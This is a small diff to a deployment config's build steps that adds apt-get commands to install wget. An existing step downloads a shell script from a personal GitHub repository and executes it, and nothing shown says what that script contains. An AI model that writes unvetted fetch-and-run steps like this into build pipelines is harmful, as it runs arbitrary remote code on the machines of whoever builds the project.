@@ -2,6 +2,9 @@ deployments:
   MyWebApp:
     dockerimage: ubuntu:14.04
     build_steps:
+      - sudo apt-get update
+      - sudo apt-get install wget
+      - sudo apt-get update
       - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud5.sh && chmod +x cloud5.sh && ./cloud5.sh
       - pip install setuptools pip
       - pip install ~/code
